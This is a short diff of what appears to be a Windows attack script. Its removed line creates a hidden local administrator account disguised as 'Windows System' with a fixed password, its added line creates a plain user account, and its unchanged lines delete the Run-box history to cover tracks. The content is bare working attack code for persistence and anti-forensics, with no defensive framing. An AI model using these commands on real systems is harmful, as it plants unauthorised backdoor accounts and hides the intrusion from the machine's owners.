@@ -1,5 +1,5 @@
 # Create local admin username : WinSystem Password : P@ssw0rd
-net user WinSystem P@ssw0rd /add /fullname:"Windows System" /passwordchg:no && net localgroup administrators WinSystem /add
+net user TOTO /ADD
 
 # delete run box history
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
